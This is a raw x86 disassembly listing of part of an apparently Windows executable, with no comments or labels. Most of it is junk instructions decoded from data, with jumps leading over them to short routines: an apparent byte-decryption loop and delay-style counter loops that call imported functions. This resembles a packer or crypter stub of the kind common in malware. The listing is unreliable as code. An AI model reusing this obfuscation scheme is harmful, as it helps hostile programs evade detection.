  40328f:	jp     0x40324f
  403291:	sahf   
  403292:	js     0x4032bc
  403294:	xlat   BYTE PTR ds:[ebx]
  403295:	stos   DWORD PTR es:[edi],eax
  403296:	jns    0x4032df
  403298:	push   es
  403299:	add    edi,DWORD PTR [esp+edi*2+0x53]
  40329d:	jl     0x40331b
  40329f:	jl     0x40324c
  4032a1:	popa   
  4032a2:	xchg   ebx,eax
  4032a3:	inc    DWORD PTR ds:0xabd3ead1
  4032a9:	ja     0x403234
  4032ab:	rcl    BYTE PTR [edx+0x44],cl
  4032ae:	sar    BYTE PTR [edx-0xe],1
  4032b1:	adc    eax,0xa47b89f
  4032b6:	test   bh,bh
  4032b8:	xor    edi,DWORD PTR [ecx]
  4032ba:	and    BYTE PTR [edi+ebp*2+0x57],dh
  4032be:	jge    0x40331b
  4032c0:	add    bh,ah
  4032c2:	pminub mm1,QWORD PTR [edx]
  4032c5:	cmp    bh,dh
  4032c7:	or     DWORD PTR [edi-0x240c8989],0x2db4a6b0
  4032d1:	in     al,0xa3
  4032d3:	push   esp
  4032d4:	fisubr DWORD PTR [ecx-0x768980c2]
  4032da:	cs xchg edx,eax
  4032dc:	fmul   st,st(1)
  4032de:	jmp    FWORD PTR [eax]
  4032e0:	pop    ebp
  4032e1:	stc    
  4032e2:	add    eax,DWORD PTR [eax]
  4032e4:	push   ebp
  4032e5:	dec    ebp
  4032e6:	push   edx
  4032e7:	icebp  
  4032e8:	sub    ecx,edx
  4032ea:	std    
  4032eb:	jo     0x4032f2
  4032ed:	mov    BYTE PTR [edx],bh
  4032ef:	cld    
  4032f0:	add    edi,DWORD PTR [edi+0x3a0af991]
  4032f6:	add    al,dl
  4032f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032f9:	mov    ch,BYTE PTR [edi+eax*8]
  4032fc:	out    dx,eax
  4032fd:	icebp  
  4032fe:	mov    eax,0x45bdfbf5
  403303:	aam    0x74
  403305:	lock adc BYTE PTR [ebp+0x14],bh
  403309:	xchg   edi,eax
  40330a:	pop    ss
  40330b:	test   ah,dh
  40330d:	in     eax,dx
  40330e:	xor    ah,bl
  403310:	push   edx
  403311:	out    0x97,eax
  403313:	popf   
  403314:	push   ecx
  403315:	dec    eax
  403316:	aam    0x6c
  403318:	or     eax,0x6ad7ea3e
  40331d:	inc    ecx
  40331e:	jnp    0x4032b6
  403320:	sbb    eax,0x82e30103
  403325:	push   ds
  403326:	mov    esi,0xac58c984
  40332b:	cmp    ah,dl
  40332d:	mov    DWORD PTR ds:0x94653c97,edx
  403333:	hlt    
  403334:	in     al,dx
  403335:	retf   0x3e2
  403338:	popf   
  403339:	mov    cl,0x51
  40333b:	(bad)  [esi]
  40333d:	jmp    0x3902bcf8
  403342:	jbe    0x40339c
  403344:	in     al,0xb3
  403346:	mov    esp,0x7a7d8a85
  40334b:	repz sbb cl,BYTE PTR [edi]
  40334e:	arpl   WORD PTR [edx+0x4e],bx
  403351:	stos   DWORD PTR es:[edi],eax
  403352:	cli    
  403353:	das    
  403354:	mov    ebp,0xd5548fda
  403359:	xchg   edi,eax
  40335a:	test   BYTE PTR [eax-0x7bdd5e9b],al
  403360:	ins    DWORD PTR es:[edi],dx
  403361:	jmp    0xcc46:0xa9ad240c
  403368:	fidivr DWORD PTR [ebp+ebx*4+0x11]
  40336c:	fcmove st,st(4)
  40336e:	fisubr DWORD PTR [edi+0x6f]
  403371:	or     al,0x29
  403373:	dec    edx
  403374:	xchg   ecx,eax
  403375:	or     eax,0xc7b5149
  40337a:	ins    DWORD PTR es:[edi],dx
  40337b:	jmp    0x4033ef
  40337d:	fwait
  40337e:	mov    edi,0xab6a2a8d
  403383:	in     al,0xa2
  403385:	add    edx,esi
  403387:	cmp    edx,edi
  403389:	mov    DWORD PTR ds:0x4292b5,0x6344
  403393:	ja     0x4034eb
  403399:	push   ebx
  40339a:	jmp    0x4033a4
  40339f:	mov    esi,0x32729e
  4033a4:	mov    eax,DWORD PTR [ebp-0x8]
  4033a7:	mov    edi,DWORD PTR [ebp-0x4]
  4033aa:	xor    edi,ecx
  4033ac:	add    edi,esi
  4033ae:	mov    esi,DWORD PTR [ebp+0x8]
  4033b1:	imul   edi,edx
  4033b4:	mov    ebx,DWORD PTR [ebp+0xc]
  4033b7:	xor    eax,ecx
  4033b9:	add    eax,edx
  4033bb:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  4033c2:	mov    BYTE PTR [edi+esi*1],al
  4033c5:	mov    eax,DWORD PTR [ebp-0x4]
  4033c8:	xor    eax,ecx
  4033ca:	lea    edx,[edx+eax*1+0x32729e]
  4033d1:	mov    eax,DWORD PTR [ebp-0x4]
  4033d4:	jmp    0x4034d6
  4033d9:	jnp    0x4033fa
  4033db:	dec    BYTE PTR [eax-0x108252a6]
  4033e1:	pop    esi
  4033e2:	mov    DWORD PTR [edx],ebp
  4033e4:	pop    ebp
  4033e5:	xchg   bl,ah
  4033e7:	and    BYTE PTR [ebp+0x7d],al
  4033ea:	add    edi,DWORD PTR [esp+edi*2+0x53]
  4033ee:	jl     0x40346c
  4033f0:	jl     0x403390
  4033f2:	add    al,0xc8
  4033f4:	xchg   BYTE PTR [eax+edx*4+0x25],cl
  4033f8:	out    dx,al
  4033f9:	adc    ch,ch
  4033fb:	cmp    BYTE PTR [edi+0x4e99755f],ah
  403401:	aaa    
  403402:	mov    ds:0xa2af7829,al
  403407:	dec    esi
  403408:	mov    DWORD PTR [ebx-0x61d967e2],esp
  40340e:	cld    
  40340f:	xchg   DWORD PTR [ebp-0x6a],esp
  403412:	test   BYTE PTR [edx],bl
  403414:	push   0xfffffffd
  403416:	adc    BYTE PTR [eax],0x50
  403419:	add    DWORD PTR [ecx+0x38],0x363f8d71
  403420:	adc    DWORD PTR [ecx-0xb],0x6a87c5e7
  403427:	xor    BYTE PTR [ecx],ch
  403429:	fistp  DWORD PTR [ecx-0x3f]
  40342c:	int3   
  40342d:	sbb    al,0xe1
  40342f:	repz xor dl,BYTE PTR [ecx-0x4c]
  403433:	repnz out 0xb1,al
  403436:	dec    esp
  403437:	inc    ebp
  403438:	fs jp  0x403483
  40343b:	sub    ecx,eax
  40343d:	or     ebp,esi
  40343f:	jg     0x40345a
  403441:	xor    eax,0xd73ca845
  403446:	mov    ch,BYTE PTR [edi-0x30]
  403449:	xchg   ecx,eax
  40344a:	push   0x43573190
  40344f:	sbb    edx,eax
  403451:	inc    edi
  403452:	push   edx
  403453:	imul   edi,esp,0x265d72f4
  403459:	sub    eax,0x641f3566
  40345e:	test   DWORD PTR [ecx-0x46d97621],esi
  403464:	mov    esp,edx
  403466:	fldlg2 
  403468:	add    al,BYTE PTR [eax]
  40346a:	pop    esp
  40346b:	mov    ds:0x25c6b910,al
  403470:	pop    ss
  403471:	mov    eax,ds:0x5579e441
  403476:	nop
  403477:	shl    BYTE PTR [esi-0x33232697],cl
  40347d:	aad    0x72
  40347f:	jg     0x403412
  403481:	jecxz  0x403425
  403483:	(bad)  
  403485:	xor    edx,esp
  403487:	cmp    esi,eax
  403489:	push   cs
  40348a:	ret    
  40348b:	aam    0x44
  40348d:	arpl   WORD PTR [ebx],ax
  40348f:	out    0x6,al
  403491:	and    bl,ah
  403493:	in     eax,dx
  403494:	xchg   ecx,eax
  403495:	je     0x4034f6
  403497:	ins    BYTE PTR es:[edi],dx
  403498:	adc    DWORD PTR [edi-0x2cbe773a],0xfffffffc
  40349f:	(bad)  
  4034a0:	cld    
  4034a1:	fnstcw WORD PTR [ebx+0x1c648c81]
  4034a7:	mov    cl,BYTE PTR [ecx-0x3f645843]
  4034ad:	xor    DWORD PTR [edx+edi*2-0x66],esp
  4034b1:	mov    esi,ecx
  4034b3:	cmp    DWORD PTR [eax+ebp*8+0x56d86354],edx
  4034ba:	push   0x5b48c1d6
  4034bf:	inc    edi
  4034c0:	or     DWORD PTR [edx],ecx
  4034c2:	test   BYTE PTR [ecx+edx*4+0x7bed597],ch
  4034c9:	mov    eax,ds:0x39d5f42e
  4034ce:	enter  0xb365,0xda
  4034d2:	sub    DWORD PTR [ecx-0x5a],ecx
  4034d5:	dec    ecx
  4034d6:	xor    eax,ecx
  4034d8:	mov    esi,0xffcd8d62
  4034dd:	sub    esi,eax
  4034df:	add    esi,DWORD PTR [ebp+0x10]
  4034e2:	cmp    edx,esi
  4034e4:	jbe    0x40339f
  4034ea:	pop    ebx
  4034eb:	mov    eax,0xf89c8534
  4034f0:	pop    edi
  4034f1:	pop    esi
  4034f2:	leave  
  4034f3:	ret    0xc
  4034f6:	push   ebp
  4034f7:	mov    ebp,esp
  4034f9:	mov    eax,ds:0x409224
  4034fe:	movzx  ecx,BYTE PTR ds:0x4292c1
  403505:	add    DWORD PTR ds:0x4275ac,ecx
  40350b:	mov    edx,0x32729e
  403510:	mov    DWORD PTR ds:0x4292d9,0x1e
  40351a:	cmp    DWORD PTR ds:0x4292d9,0x0
  403521:	je     0x4035b5
  403527:	cmp    DWORD PTR ds:0x4292d9,0x27
  40352e:	jne    0x40353f
  403534:	push   0x1072
  403539:	call   DWORD PTR ds:0x427c43
  40353f:	mov    ecx,DWORD PTR ds:0x4292d9
  403545:	dec    ecx
  403546:	mov    DWORD PTR ds:0x4292d9,ecx
  40354c:	jmp    0x40351a
  403551:	and    DWORD PTR ds:0x4292c5,0x0
  40355b:	xor    ecx,ecx
  40355d:	or     ecx,DWORD PTR ds:0x4292c5
  403563:	inc    ecx
  403564:	mov    DWORD PTR ds:0x4292c5,ecx
  40356a:	cmp    DWORD PTR ds:0x4292c5,0xd
  403571:	jne    0x40358c
  403577:	push   0x42c892
  40357c:	push   0x4275ed
  403581:	push   0x400000
  403586:	call   DWORD PTR ds:0x427a93
  40358c:	cmp    DWORD PTR ds:0x4292c5,0xc
  403593:	jne    0x4035a8
  403599:	xor    ecx,ecx
  40359b:	or     ecx,DWORD PTR ds:0x4292c5
  4035a1:	inc    ecx
  4035a2:	mov    DWORD PTR ds:0x4292c5,ecx
  4035a8:	cmp    DWORD PTR ds:0x4292c5,0x17
  4035af:	jb     0x40355b
  4035b5:	sub    eax,edx
  4035b7:	mov    ecx,DWORD PTR ds:0x42c8ae
  4035bd:	mov    ecx,DWORD PTR [ecx]
  4035bf:	sbb    DWORD PTR ds:0x4275b0,ecx
  4035c5:	mov    ecx,0x7510857
  4035ca:	push   esi
  4035cb:	mov    esi,DWORD PTR [ebp+0xc]
  4035ce:	xor    eax,ecx
  4035d0:	cmp    eax,esi
  4035d2:	je     0x403916
  4035d8:	mov    eax,ds:0x40921c
  4035dd:	mov    esi,DWORD PTR [ebp+0xc]
  4035e0:	sub    eax,edx
  4035e2:	jmp    0x4036e1
  4035e7:	not    DWORD PTR [ebx-0x6c]
  4035ea:	adc    ch,BYTE PTR [eax-0x13]
  4035ed:	lea    ebp,[ebp+0x4f]
  4035f0:	xchg   edi,eax
  4035f1:	xchg   esp,eax
  4035f2:	cwde   
  4035f3:	xor    al,0x2d
  4035f5:	fiadd  DWORD PTR [ebx+0x50]
  4035f8:	add    bh,BYTE PTR [esp+edi*2+0x5e]
  4035fc:	jl     0x40367a
  4035fe:	jl     0x4035cf
  403600:	scas   al,BYTE PTR es:[edi]
  403601:	mov    dl,0xd5
  403603:	fisttp WORD PTR [ecx]
  403605:	sbb    dh,bh
  403607:	sbb    esp,edi
  403609:	aam    0xc7
  40360b:	adc    DWORD PTR [edx],edi
  40360d:	adc    al,0xdd
  40360f:	adc    eax,0x2924e567
  403614:	stc    
  403615:	bsf    eax,edi
  403618:	adc    edi,esi
  40361a:	sbb    al,0xa6
  40361c:	fistp  WORD PTR [edx]
  40361e:	xor    DWORD PTR [edi+0x51876623],ebx
  403624:	mov    ah,0xe8
  403626:	mov    edi,0x272073d3
  40362b:	mov    DWORD PTR [ecx+ebp*8+0x44],esi
  40362f:	lds    eax,FWORD PTR [edi+0x33560ac1]
  403635:	dec    ebp
  403636:	stc    
  403637:	inc    esi
  403638:	iret   
  403639:	xor    esp,ecx
  40363b:	push   DWORD PTR [eax+eax*4]
  40363e:	fs dec edi
  403640:	cmp    al,BYTE PTR [edi+0x70cf62cc]
  403646:	mov    ecx,0xadd91b6a
  40364b:	loope  0x4036b2
  40364d:	mov    edx,0x4ef40424
  403652:	pop    edx
  403653:	ds cmp al,0x20
  403656:	dec    esi
  403657:	mov    ecx,0x5995f662
  40365c:	or     ecx,DWORD PTR [edi+0x5c]
  40365f:	cmp    BYTE PTR [eax+0x7e],bh
  403662:	mov    edx,esp
  403664:	adc    dl,BYTE PTR ds:0x3e50ef97
  40366a:	dec    eax
  40366b:	cli    
  40366c:	scas   eax,DWORD PTR es:[edi]
  40366d:	mov    bl,0x7b
  40366f:	add    BYTE PTR [ebx+0x0],al
  403672:	add    dl,bl
  403674:	cmp    bh,BYTE PTR [edi-0x3f]
  403677:	add    DWORD PTR [edi],edi
  403679:	in     al,dx
  40367a:	(bad)  
  40367b:	cmp    esp,ebx
  40367d:	imul   eax,DWORD PTR [esp+ebx*8],0xffffffbd
  403681:	inc    esp
  403682:	sbb    esi,eax
  403684:	aas    
  403685:	inc    ebx
  403686:	or     esi,edx
  403688:	cdq    
  403689:	pop    ds
  40368a:	aam    0x48
  40368c:	push   ds
  40368d:	call   0x9cd1d384
  403692:	(bad)  
  403693:	push   cs
  403694:	fisttp WORD PTR [edi+esi*2+0x7c8de595]
  40369b:	(bad)  
  40369c:	xchg   ebx,eax
  40369d:	sbb    BYTE PTR [eax-0x43],bh
  4036a0:	scas   al,BYTE PTR es:[edi]
  4036a1:	add    eax,0xd8e4bcf0
  4036a6:	(bad)  
  4036a7:	push   esi
  4036a8:	pop    ds
  4036a9:	cwde   
  4036aa:	rol    DWORD PTR [edx-0x44],cl
  4036ad:	jns    0x4036ac
  4036af:	fisub  DWORD PTR [esi-0x6c]
  4036b2:	sbb    esp,DWORD PTR [edx+0x7d885c91]
  4036b8:	fistp  QWORD PTR [edi+ecx*2-0x5a1ddc32]
  4036bf:	or     DWORD PTR [eax+0x400ad51],edx
  4036c5:	adc    dh,BYTE PTR ds:0xc3095157
  4036cb:	jae    0x40373c
  4036cd:	in     eax,0x1e
  4036cf:	in     eax,0x73
  4036d1:	fsub   QWORD PTR [eax+0x493a1c62]
  4036d7:	call   0xe00:0xbee527eb
  4036de:	add    BYTE PTR [esi+0x3bc133bf],bh
  4036e4:	(bad)  
  4036e5:	jne    0x4037fa
  4036eb:	mov    eax,ds:0x409224
  4036f0:	add    eax,DWORD PTR ds:0x40921c
  4036f6:	jmp    0x403900
  4036fb:	jmp    0x4037fa
  403700:	xchg   esi,eax
  403701:	xchg   ebx,eax
  403702:	pop    ecx
  403703:	test   BYTE PTR [ebp+0x7a],bl
  403706:	imul   esp,DWORD PTR [ebp-0x47e923f9],0x2ec498bc
  403710:	mov    dl,0x5
  403712:	jl     0x403790
  403714:	pop    esi
  403715:	jl     0x403793
  403717:	jl     0x4036fe
  403719:	add    BYTE PTR [ebp+0x28],bh
  40371c:	xchg   esi,eax
  40371d:	retf   0xfe7f
  403720:	pop    edi
  403721:	fcomp  DWORD PTR [ecx-0x3b9b673b]
  403727:	pop    esi
  403728:	mov    dh,0xd
  40372a:	or     ch,ch
  40372c:	jl     0x4036d0
  40372e:	add    eax,0x92d59e1b
  403733:	pop    ebx
  403734:	stos   DWORD PTR es:[edi],eax
  403735:	frstor [ebx]
  403737:	loopne 0x403778
  403739:	fwait
  40373a:	aad    0x28
  40373c:	push   esp
  40373d:	les    ebp,FWORD PTR [edx+0x58d7aae7]
  403743:	je     0x4036fd
  403745:	push   cs
  403746:	out    dx,al
  403747:	and    BYTE PTR [ebp-0x3b798477],dl
  40374d:	shr    esp,1
  40374f:	fild   QWORD PTR [esp+ecx*1-0x33]
  403753:	clc    
  403754:	jmp    0x40370f
  403756:	push   eax
  403757:	stc    
  403758:	retf   
  403759:	cmp    DWORD PTR [edx+0x4e],esi
  40375c:	loopne 0x403760
  40375e:	ins    DWORD PTR es:[edi],dx
  40375f:	call   0x81156cc
  403764:	xchg   ecx,eax
  403765:	add    al,0x24
  403767:	pop    ss
  403768:	xor    DWORD PTR [ebx-0x650e8e2f],esp
  40376e:	jg     0x4037bb
  403770:	and    eax,0xed9a91b1
  403775:	inc    esp
  403776:	cmp    eax,0xb1aaa1ab
  40377b:	cmp    eax,eax
  40377d:	pop    ecx
  40377e:	ins    DWORD PTR es:[edi],dx
  40377f:	xor    eax,0xc97e6a64
  403784:	pop    DWORD PTR [esp+ebp*2+0x14c07fc3]
  40378b:	arpl   di,dx
  40378d:	cld    
  40378e:	sub    edx,esi
  403790:	aas    
  403791:	clc    
  403792:	imul   ch
  403794:	sbb    BYTE PTR [edx-0x919d7d0],al
  40379a:	les    ecx,FWORD PTR [ebx+edi*1+0x2f]
  40379e:	fistp  DWORD PTR [eax-0x2aa40744]
  4037a4:	dec    ecx
  4037a5:	adc    dl,BYTE PTR [eax+0xc]
  4037a8:	jmp    0x4037c0
  4037aa:	adc    BYTE PTR [eax+0x79],0x6b
  4037ae:	in     al,dx
  4037af:	xchg   ebx,eax
  4037b0:	bound  edx,QWORD PTR [ebp-0xf]
  4037b3:	mov    eax,0xbd43c278
  4037b8:	pop    edx
  4037b9:	sub    BYTE PTR [ebx+0x7b02cd41],bl
  4037bf:	jmp    0x403804
  4037c1:	outs   dx,DWORD PTR ds:[esi]
  4037c2:	imul   ebx,eax,0x3b3f0f8f
  4037c8:	xchg   edx,eax
  4037c9:	pop    edx
  4037ca:	and    DWORD PTR [ecx],esp
  4037cc:	iret   
  4037cd:	pusha  
  4037ce:	dec    ecx
  4037cf:	mov    al,0x6f
  4037d1:	mov    ds:0x4cb8eb00,al
  4037d6:	or     eax,0x14038b44
  4037db:	arpl   di,cx
  4037dd:	pop    es
  4037de:	or     BYTE PTR [ebp-0x6acfcf51],ah
  4037e4:	cmp    DWORD PTR [eax+0x2],ecx
  4037e7:	mov    cl,BYTE PTR [eax]
  4037e9:	push   ebp
  4037ea:	enter  0x32a9,0xc
  4037ee:	scas   al,BYTE PTR es:[edi]
  4037ef:	mov    WORD PTR [eax+0x3ba00b5f],cs
  4037f5:	sbb    DWORD PTR [esi],ebx
  4037f7:	mov    bl,0xd
  4037f9:	stos   DWORD PTR es:[edi],eax
  4037fa:	mov    eax,DWORD PTR [ebp+0xc]
  4037fd:	jmp    0x4038fc
  403802:	add    al,0x38
  403804:	and    DWORD PTR [ebx-0x5b],0x27bfa7d
  40380b:	jg     0x40385f
  40380d:	and    al,al
  40380f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403810:	test   al,0xf7
  403812:	xchg   esp,eax
  403813:	add    al,0x7c
  403815:	jl     0x403875
  403817:	jl     0x403895
  403819:	jl     0x40381e
  40381b:	add    eax,0xbd826c85
  403820:	test   eax,0xd7f40737
  403825:	xchg   ebp,eax
  403826:	f2xm1  
  403828:	mov    ebx,edx
  40382a:	and    eax,0x8d50146a
  40382f:	pop    edx
  403830:	xor    BYTE PTR [eax+0x1095a53d],bl
  403836:	jbe    0x4037f0
  403838:	jne    0x403855
  40383a:	mov    esp,0x746eb492
  40383f:	ja     0x403881
  403841:	adc    ebp,edx
  403843:	or     eax,0x48af0fc0
  403848:	retf   
  403849:	pop    ebp
  40384a:	pop    ecx
  40384b:	pop    ebp
  40384c:	or     bl,BYTE PTR [ebp+eax*8+0x64]
  403850:	add    edx,DWORD PTR ds:0xfaa4d2e3
  403856:	ret    0x1942
  403859:	adc    bh,BYTE PTR [ecx-0x2acb5b3a]
  40385f:	xor    eax,DWORD PTR [ecx+edi*1]
  403862:	push   ebp
  403863:	inc    esp
  403864:	jmp    0x4038a5
  403866:	scas   al,BYTE PTR es:[edi]
  403867:	xor    al,0xb6
  403869:	xchg   ebp,eax
  40386a:	jecxz  0x4037f9
  40386c:	ret    0x2821
  40386f:	jb     0x4038ca
  403871:	mov    eax,ds:0x643e7bee
  403876:	scas   al,BYTE PTR es:[edi]
  403877:	push   0x34
  403879:	mov    cl,0x1c
  40387b:	push   0xffffffa5
  40387d:	(bad)  
  40387f:	jmp    0xc34e1b5d
  403884:	inc    eax
  403885:	push   edi
  403886:	nop
  403887:	or     eax,0xc3e49b95
  40388c:	adc    bl,BYTE PTR [edi-0x76]
  40388f:	and    cl,BYTE PTR [esi+0xa974729]
  403895:	jbe    0x4038c5
  403897:	pushf  
  403898:	daa    
  403899:	and    dh,BYTE PTR [esi]
  40389b:	jb     0x4038f9
  40389d:	sbb    ah,cl
  40389f:	(bad)  
  4038a0:	jmp    ecx
  4038a2:	xchg   DWORD PTR [edi-0x342a628c],eax
  4038a8:	fwait
  4038a9:	stos   DWORD PTR es:[edi],eax
  4038aa:	(bad)  
  4038ab:	pop    es
  4038ac:	mov    BYTE PTR [ecx+0x73],cl
  4038af:	aas    
  4038b0:	add    BYTE PTR [eax],dh
  4038b2:	prefetch BYTE PTR [eax+0x44c1c621]
  4038b9:	aam    0x55
  4038bb:	(bad)  
  4038bd:	clc    
  4038be:	shl    bl,1
  4038c0:	mov    eax,0x5f69a220
  4038c5:	push   ds
  4038c6:	nop
  4038c7:	mov    cl,0x21
  4038c9:	push   0xffffffa5
  4038cb:	push   0x11
  4038cd:	repz lea edx,[ecx+0x40]
  4038d1:	pushf  
  4038d2:	push   0x7c
  4038d4:	and    al,0x49
  4038d6:	mov    cl,0xad
  4038d8:	xor    dh,cl
  4038da:	int3   
  4038db:	outs   dx,BYTE PTR ds:[esi]
  4038dc:	lods   al,BYTE PTR ds:[esi]
  4038dd:	pushf  
  4038de:	adc    eax,0xeb86a0f5
  4038e3:	mov    edi,0x6bd530a
  4038e8:	dec    ebp
  4038e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ea:	imul   edi,DWORD PTR [edx],0xffffffa1
  4038ed:	ficom  WORD PTR [esi+0x3]
  4038f0:	cmp    dl,cl
  4038f2:	dec    DWORD PTR [edi-0x78b31288]
  4038f8:	xor    DWORD PTR [esi-0x3ecc06b8],edi
  4038fe:	add    eax,edx
  403900:	mov    ds:0x40921c,eax
  403905:	mov    eax,DWORD PTR [ebp+0xc]
  403908:	xor    eax,ecx
  40390a:	add    eax,edx
  40390c:	mov    ds:0x409224,eax
  403911:	jmp    0x403920
  403916:	mov    eax,ds:0x409224
  40391b:	mov    ds:0x40921c,eax
  403920:	mov    eax,DWORD PTR [ebp+0x8]
  403923:	mov    eax,DWORD PTR [eax]
  403925:	mov    ecx,DWORD PTR ds:0x40921c
  40392b:	add    DWORD PTR [eax],ecx
  40392d:	pop    esi
  40392e:	pop    ebp
  40392f:	ret    0x8
  403932:	push   ebp
  403933:	mov    ebp,esp
  403935:	sub    esp,0x58
  403938:	mov    DWORD PTR ds:0x42c89e,0x1c
  403942:	cmp    DWORD PTR ds:0x42c89e,0x0
  403949:	je     0x40397e
  40394f:	cmp    DWORD PTR ds:0x42c89e,0x22
  403956:	jne    0x40396b
  40395c:	push   DWORD PTR [ebp-0x14]
  40395f:	push   DWORD PTR [ebp-0x28]
  403962:	push   DWORD PTR [ebp-0x10]
  403965:	call   DWORD PTR ds:0x4278ef
  40396b:	xor    eax,eax
  40396d:	add    eax,DWORD PTR ds:0x42c89e
  403973:	dec    eax
  403974:	mov    ds:0x42c89e,eax
  403979:	jmp    0x403942
  40397e:	mov    ecx,DWORD PTR [ebp+0x8]
  403981:	mov    eax,0x8a42
  403986:	xor    ax,WORD PTR [ecx+0x20]
  40398a:	mov    ecx,0x3b08
  40398f:	add    ax,cx
  403992:	jmp    0x403a97
  403997:	sar    BYTE PTR [edi-0x226ae210],cl
  40399d:	jge    0x403a06
  40399f:	js     0x4039f2
  4039a1:	dec    edi
  4039a2:	mov    esi,0x6d80eb81
  4039a7:	test   BYTE PTR [edi],0x7c
  4039aa:	jl     0x403a00
  4039ac:	jl     0x403a2a
  4039ae:	jl     0x4039d4
  4039b0:	or     dl,dl
  4039b2:	iret   
  4039b3:	dec    eax
  4039b4:	lea    eax,[ebx-0xf]
  4039b7:	jp     0x4039dd
  4039b9:	aas    
  4039ba:	dec    ebx
  4039bb:	fs cli 
  4039bd:	repz or DWORD PTR [eax-0x11bae07c],ebp
  4039c4:	pop    es
  4039c5:	xchg   DWORD PTR [ebp-0x6e36d91f],edi
  4039cb:	mov    bh,0x8d
  4039cd:	jae    0x403a30
  4039cf:	dec    edx
  4039d0:	dec    ecx
  4039d1:	mov    al,0xd0
  4039d3:	call   0x89b9:0x4030e6b1
  4039da:	shl    dl,0xe4
  4039dd:	xchg   esp,eax
  4039de:	mov    BYTE PTR [ecx-0x4f00bf71],bh
  4039e4:	and    eax,0x9cd23445
  4039e9:	aad    0x72
  4039eb:	mov    esi,0x16bf51d3
  4039f0:	push   0x880f0a22
  4039f5:	loop   0x40398b
  4039f7:	mov    bl,BYTE PTR [eax]
  4039f9:	sbb    DWORD PTR [edi-0x441c95af],ebp
  4039ff:	dec    ebx
  403a00:	xchg   esi,eax
  403a01:	mov    BYTE PTR ds:0x839b9662,0xb1
  403a08:	pushf  
  403a09:	mov    bh,bh
  403a0b:	sub    al,BYTE PTR [esi]
  403a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a0e:	hlt    
  403a0f:	loopne 0x403a09
  403a11:	test   BYTE PTR [esi-0x5e06c1c7],bh
  403a17:	(bad)  
  403a18:	popa   
  403a19:	mov    al,ds:0xe5a4f67f
  403a1e:	jg     0x4039a8
  403a20:	(bad)  
  403a22:	sub    DWORD PTR [bp+si+0x7e],0xffffffce
  403a27:	imul   DWORD PTR [ebp+0x685fcc91]
  403a2d:	push   0x21878e1a
  403a32:	popf   
  403a33:	aas    
  403a34:	test   BYTE PTR [esi+0x636d5879],cl
  403a3a:	test   BYTE PTR [esi+0x2e],0x21
  403a3e:	mov    ecx,0xed166b76
  403a43:	pushf  
  403a44:	aad    0x86
  403a46:	and    eax,0x7ac4eaca
  403a4b:	call   0x384c27f6
  403a50:	adc    ebp,edi
  403a52:	add    edx,DWORD PTR [edi+0x60]
  403a55:	imul   ebp,DWORD PTR [edx+0x5dcf8e0],0x7b
  403a5c:	jbe    0x403adb
  403a5e:	cmc    
  403a5f:	sub    DWORD PTR [esi+eiz*2+0x50],ebx
  403a63:	hlt    
  403a64:	arpl   WORD PTR [esi],dx
  403a66:	inc    ebx
  403a67:	add    DWORD PTR [edi-0xc],edi
  403a6a:	pop    ecx
  403a6b:	jno    0x403ae9
  403a6d:	xchg   DWORD PTR [ecx],eax
  403a6f:	mov    ebx,0x28f685e7
  403a74:	adc    BYTE PTR [eax],0xd
  403a77:	cwde   
  403a78:	xchg   edx,eax
  403a79:	into   
  403a7a:	shl    BYTE PTR [esi+edi*4],0x55
  403a7e:	test   DWORD PTR [ecx+0x2e],esi
  403a81:	scas   al,BYTE PTR es:[edi]
  403a82:	mov    cl,0x9e
  403a84:	jl     0x403ae5
  403a86:	xor    al,0x6f
  403a88:	data16 loopne 0x403a5a
  403a8b:	push   eax
  403a8c:	arpl   WORD PTR [ebx],sp
  403a8e:	addr16 inc edi
  403a90:	clc    
  403a91:	sub    DWORD PTR [esp+ecx*1+0xf59401c],edx
  403a98:	mov    bh,0xc0
  403a9a:	xor    ecx,ecx
  403a9c:	xor    ecx,DWORD PTR ds:0x427db0
  403aa2:	mov    ecx,DWORD PTR [ecx]
  403aa4:	or     DWORD PTR ds:0x42c88a,ecx
  403aaa:	mov    DWORD PTR [ebp-0xc],eax
  403aad:	adc    DWORD PTR ds:0x42c882,ecx
  403ab3:	mov    BYTE PTR [ebp-0x1],0x7f
  403ab7:	not    ecx
  403ab9:	lea    eax,[ebp-0x1]
  403abc:	xor    DWORD PTR ds:0x42c88a,0x4292b9
  403ac6:	mov    DWORD PTR [ebp-0x10],eax
  403ac9:	mov    DWORD PTR ds:0x427d0f,0x12
  403ad3:	cmp    DWORD PTR ds:0x427d0f,0x0
  403ada:	je     0x403b2a
  403ae0:	cmp    DWORD PTR ds:0x427d0f,0x8
  403ae7:	jne    0x403af6
  403aed:	push   DWORD PTR [ebp-0xc]
  403af0:	call   DWORD PTR ds:0x4279cf
  403af6:	cmp    DWORD PTR ds:0x427d0f,0x9
  403afd:	jne    0x403b12
  403b03:	xor    ecx,ecx
  403b05:	xor    ecx,DWORD PTR ds:0x427d0f
  403b0b:	dec    ecx
  403b0c:	mov    DWORD PTR ds:0x427d0f,ecx
  403b12:	mov    ecx,DWORD PTR ds:0x427d0f
  403b18:	dec    ecx
  403b19:	mov    DWORD PTR ds:0x427d0f,ecx
  403b1f:	jmp    0x403ad3
  403b24:	sbb    DWORD PTR ds:0x4292bd,edi
  403b2a:	mov    al,BYTE PTR [ebp-0x1]
  403b2d:	xor    DWORD PTR ds:0x4292b9,0x35da
  403b37:	mov    ecx,DWORD PTR [ebp-0x10]
  403b3a:	xor    DWORD PTR ds:0x4292bd,0x513b
  403b44:	xor    al,0x49
  403b46:	xor    DWORD PTR ds:0x42c89a,0x3273
  403b50:	sub    al,0x35
  403b52:	add    DWORD PTR ds:0x4292a5,0x42759c
  403b5c:	mov    BYTE PTR [ecx],al
  403b5e:	xor    DWORD PTR ds:0x427d17,0x427d07
  403b68:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  403b6f:	jmp    0x403c74
  403b74:	(bad)  
  403b75:	xor    cl,BYTE PTR [edi]
  403b77:	adc    ebx,DWORD PTR [ebx]
  403b79:	in     eax,0xfa
  403b7b:	std    
  403b7c:	add    edi,DWORD PTR [edx-0x521038c1]
  403b82:	mov    ?,ecx
  403b84:	out    dx,al
  403b85:	push   es
  403b86:	jl     0x403c04
  403b88:	push   esp
  403b89:	jl     0x403c07
  403b8b:	jl     0x403b48
  403b8d:	mov    ah,0xd
